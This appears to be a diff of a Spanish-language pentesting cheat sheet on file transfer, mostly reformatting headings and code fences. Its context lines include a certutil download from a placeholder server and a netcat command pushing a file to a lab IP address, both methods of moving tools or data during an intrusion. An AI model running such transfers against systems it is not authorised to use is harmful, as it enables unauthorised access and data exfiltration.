@@ -66,10 +66,11 @@ python -m SimpleHTTPServer
 certutil.exe -urlcache -f http://<SERVER_IP>/file.txt file.txt
 
 wget http://<SERVER_IP>/file.txt
+```
 
 
-#FTP
-
+### FTP
+```python
 #Servidor
 
 python3 -m pyftpdlib
@@ -79,9 +80,8 @@ python3 -m pyftpdlib
 ftp <SERVER_IP>
 ```
 
-
-#Netcat
-
+### Netcat
+```python
 #Servidor
 
 nc 10.10.14.2 4242 < file.tgz
